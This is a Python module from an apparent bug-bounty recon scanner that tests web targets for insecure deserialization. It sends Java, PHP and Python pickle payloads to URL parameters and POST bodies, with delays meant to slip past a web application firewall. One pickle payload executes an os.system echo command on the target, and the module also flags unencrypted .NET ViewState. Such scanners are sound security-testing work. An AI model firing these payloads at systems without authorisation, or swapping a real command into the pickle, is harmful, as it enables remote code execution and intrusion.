import re
import base64
from core.ui import vuln, found, CYN, RED, GRY, RESET, info
from core.http import http_probe
from . import BaseScanner
import logging
logger = logging.getLogger("bb-recon")

JAVA_GADGETS = [
    ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==", "Java serialized (HashSet)"),
    ("aced0005", "Java serialized (magic bytes hex)"),
]

PHP_PAYLOADS = [
    ('O:8:"stdClass":0:{}', "PHP stdClass", "php-stdclass"),
    ('a:1:{s:4:"test";s:4:"bbr3";}', "PHP array", "php-array"),
    ('O:17:"TemplateException":0:{}', "PHP TemplateException", "php-template-exc"),
]

PYTHON_PAYLOADS = [
    ("cos\nsystem\n(S'echo bbr3c0n_deser_test'\ntR.", "Python pickle (os.system)", "pickle-system"),
    ("(dp0\nS'test'\np1\nS'bbr3c0n'\np2\ns.", "Python pickle (dict)", "pickle-dict"),
]

DESER_EVIDENCE = re.compile(
    r"(java\.lang\.\w+Exception|java\.io\.InvalidClassException"
    r"|unserialize\(\)|__PHP_Incomplete_Class"
    r"|ClassNotFoundException|readObject|ObjectInputStream"
    r"|phpDeserializationException|Unexpected serialized"
    r"|pickle\.loads|unpickling"
    r"|BinaryFormatter|ViewStateException"
    r"|bbr3c0n_deser_test)", re.I
)

VIEWSTATE_RE = re.compile(r'__VIEWSTATE[^"]*"([^"]+)"', re.I)

class DeserializationScanner(BaseScanner):
    async def scan(self, url: str) -> list:
        findings = []
        await self._waf_sleep()

        code_base, body_base, hdrs_base, _ = await http_probe(self.session, url, timeout=8)
        if code_base == 0:
            return findings

        ct = hdrs_base.get("Content-Type", "").lower()
        server = hdrs_base.get("Server", "").lower() + " " + hdrs_base.get("X-Powered-By", "").lower()

        if "java" in server or "tomcat" in server or "spring" in server or "jboss" in server:
            info(f"Java backend detected — testing Java deserialization ...")
            for b64_payload, desc in JAVA_GADGETS:
                try:
                    raw = base64.b64decode(b64_payload)
                    code2, body2, hdrs2, _ = await http_probe(
                        self.session, url, timeout=10, method="POST",
                        data=raw,
                        extra_headers={"Content-Type": "application/x-java-serialized-object"}
                    )
                    await self._waf_sleep()

                    if DESER_EVIDENCE.search(body2):
                        m = DESER_EVIDENCE.search(body2)
                        vuln(f"JAVA DESERIALIZATION: {url}")
                        print(GRY+"│    "+RESET+CYN+f"Payload: {desc}"+RESET)
                        print(GRY+"│    "+RESET+RED+f"Evidence: {m.group(0)[:80]}"+RESET)
                        findings.append({
                            "type": "Deserialization-Java", "url": url,
                            "technique": desc, "evidence": m.group(0)[:120],
                            "severity": "CRITICAL",
                        })
                        break

                    if code2 == 500 and ("exception" in body2.lower() or "error" in body2.lower()):
                        found(f"Java deserialization error response: {url}")
                        findings.append({
                            "type": "Deserialization-Java-Error", "url": url,
                            "technique": desc, "severity": "HIGH",
                            "confidence": "LIKELY",
                            "evidence": body2[:200],
                        })
                except Exception as e:
                    logger.debug(f"Java deser test failed: {e}")

        if "php" in server or "php" in ct:
            info(f"PHP backend detected — testing PHP deserialization ...")
            parsed, params = self._get_params(url)
            for param in list(params.keys())[:3]:
                for payload, desc, tag in PHP_PAYLOADS:
                    tp = dict(params)
                    tp[param] = [payload]
                    test_url = self._build_url(parsed, tp)

                    code2, body2, _, _ = await http_probe(self.session, test_url, timeout=8)
                    await self._waf_sleep()

                    if DESER_EVIDENCE.search(body2):
                        m = DESER_EVIDENCE.search(body2)
                        vuln(f"PHP DESERIALIZATION: {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {desc}"+RESET)
                        findings.append({
                            "type": "Deserialization-PHP", "url": url,
                            "param": param, "technique": desc,
                            "evidence": m.group(0)[:120], "severity": "CRITICAL",
                        })
                        break

        if body_base:
            vs_match = VIEWSTATE_RE.search(body_base)
            if vs_match:
                viewstate = vs_match.group(1)
                try:
                    decoded = base64.b64decode(viewstate)
                    if decoded[:2] != b'\xff\x01':
                        found(f"ViewState NOT encrypted: {url}")
                        findings.append({
                            "type": "Deserialization-ViewState", "url": url,
                            "severity": "HIGH",
                            "evidence": f"ViewState is base64 but not encrypted (first bytes: {decoded[:10]})",
                            "note": "Unencrypted ViewState may allow .NET deserialization attacks",
                        })
                except Exception:
                    pass

        parsed, params = self._get_params(url)
        for param in list(params.keys())[:2]:
            for payload, desc, tag in PYTHON_PAYLOADS:
                b64_payload = base64.b64encode(payload.encode()).decode()
                tp = dict(params)
                tp[param] = [b64_payload]
                test_url = self._build_url(parsed, tp)

                code2, body2, _, _ = await http_probe(self.session, test_url, timeout=8)
                await self._waf_sleep()

                if DESER_EVIDENCE.search(body2):
                    vuln(f"PYTHON DESERIALIZATION: {url}")
                    findings.append({
                        "type": "Deserialization-Python", "url": url,
                        "param": param, "technique": desc,
                        "severity": "CRITICAL",
                    })
                    break

        return findings
